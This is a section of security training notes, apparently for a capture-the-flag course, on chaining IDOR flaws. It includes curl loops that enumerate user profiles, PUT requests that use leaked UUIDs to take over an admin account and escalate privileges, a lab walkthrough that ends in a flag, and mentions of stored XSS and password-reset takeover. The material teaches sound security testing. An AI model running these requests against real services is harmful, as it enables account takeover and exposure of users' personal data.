# Section 11 — Chaining IDOR Vulnerabilities

---

## The Pattern

Stand-alone IDORs are valuable. **Chained** IDORs are devastating:

```
1. GET IDOR             → leak validators (uuid, role, hidden fields)
2. PUT IDOR             → use the leaked values to bypass write authZ
3. Privilege escalation → modify your own role using GET'd reference data
4. Full takeover        → create/delete users with elevated role
```

The GET-then-write pattern is the canonical IDOR chain.

---

## Step-by-Step Chain

### 1. Enumerate via GET IDOR
```bash
for i in {1..30}; do
  curl -sk "$URL/api.php/profile/$i"
done
```

You now have every user's:
- `uid` (matches path)
- `uuid` (the secret token that validates writes)
- `role` (reveals what role names exist)
- `email`, `full_name`, etc. (PII)

### 2. Identify Admin
Filter for non-default roles:
```bash
for i in {1..30}; do
  data=$(curl -sk "$URL/api.php/profile/$i")
  echo "$data" | grep -qE 'admin|manager|root|super' && echo "Admin candidate: $data"
done
```

### 3. PUT to Update Admin's Data
With the leaked `uuid`, you satisfy the uuid-mismatch check:
```bash
curl -sk -X PUT "$URL/api.php/profile/10" \
  -H "Content-Type: application/json" \
  -d '{"uid":"10","uuid":"<LEAKED_UUID>","role":"staff_admin","full_name":"admin","email":"hacked@x.com","about":"x"}'
```

### 4. Privilege Escalation (Optional)
Set YOUR uid's role to the leaked admin role:
```bash
curl -sk -X PUT "$URL/api.php/profile/1" \
  -d '{"uid":"1","uuid":"<YOUR_UUID>","role":"staff_admin","full_name":"...","email":"...","about":"..."}'
```

Now your account has admin privileges — you can create/delete users via POST/DELETE.

---

## Why Each Step Works

The application's authZ checks are layered but incomplete:
- ✗ No check on GET → enables enumeration
- ✓ Path uid matches body uid → satisfied by editing the path
- ✓ Body uuid matches target's uuid → satisfied via leaked uuid (Step 1)
- ✓ Role must be in allowed list → satisfied via leaked role name (Step 1)
- ✗ No check on "current session can edit target user" → the actual missing control

Each check passes because we have the data needed to satisfy it. The MISSING check (session-bound owner verification) is what makes the chain work.

---

## Attack Outcomes via Chaining

| Outcome | How |
|---------|-----|
| Modify any user's profile | PUT with their uuid (Step 3) |
| Trigger password reset | Change victim's email → request reset → take over account |
| Stored XSS | Inject `<script>` into `about` field → fires when admin views the user |
| Privilege escalation | Set own role to admin's role name (Step 4) |
| Bulk modification | Loop PUT for every uid (mass tampering) |
| Account creation | After role escalation: POST new users with arbitrary fields |
| Account deletion | After role escalation: DELETE other users |

---

## Lab — Modify Admin Email

**Target:** `154.57.164.71:30652`

### Step 1 — Find admin
```bash
URL="http://154.57.164.71:30652"
for i in {1..30}; do
  data=$(curl -sk "$URL/profile/api.php/profile/$i")
  echo "$data" | grep -qE 'admin' && echo "uid=$i: $data"
done
```

Hit:
```
uid=10: {"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}
```

### Step 2 — PUT new email using leaked uuid
```bash
curl -sk -X PUT "$URL/profile/api.php/profile/10" \
  -H "Content-Type: application/json" \
  -d '{"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"flag@idor.htb","about":"x"}'
```

### Step 3 — Verify
```bash
curl -sk "$URL/profile/api.php/profile/10"
# email is now "flag@idor.htb"
```

### Step 4 — Read flag from edit profile page
The lab serves the flag on the admin's edit profile page once their email matches:
```bash
curl -sk "$URL/profile/index.php" -b "role=staff_admin" | grep -oE 'HTB\{[^}]+\}'
```

**Flag:** `HTB{1_4m_4n_1d0r_m4573r}`

---

## Real-World Chain Examples

This pattern appears in production constantly:

| Real example | Description |
|--------------|-------------|
| **Snapchat (2014)** | GET /api/user/{id} leaked phone numbers + uuids → PUT used to swap accounts |
| **Facebook Graph API quirks** | Some endpoints accepted IDs without authZ → user data scraping |
| **GitHub Pages CNAME bug** | Read-only IDOR on repo settings → could verify ownership of others' domains |
| **AWS S3 misconfigs** | Predictable bucket names + no authZ on object listing → mass enumeration |
| **HackerOne reports** | "Reading user's private notes" via /api/notes/{id} — leads to PUT with leaked uuid |

The same playbook: enumerate first, weaponize second.

---

## Exam Notes

- **GET IDOR is the gateway** — even when writes are mitigated, info disclosure unlocks them
- **uuid mismatch** errors are a TELL — they mean the API is reading the uuid for validation. Read the victim's profile to get it, then satisfy the check.
- **Role enumeration via GET** reveals valid role names — you can't set `role=admin` blindly because validation rejects unknown roles, but `role=staff_admin` works once you've seen it in another user's profile
- The **cookie+JSON dual-source role** pattern is common — modify both for full effect
- For real bug bounty: pair every GET IDOR finding with the corresponding write IDORs (PUT/POST/DELETE) — the chain multiplies severity from "info disclosure" to "account takeover"
- Stored XSS via the `about` field is a common secondary attack — admin's session is hijacked when they view your tampered profile
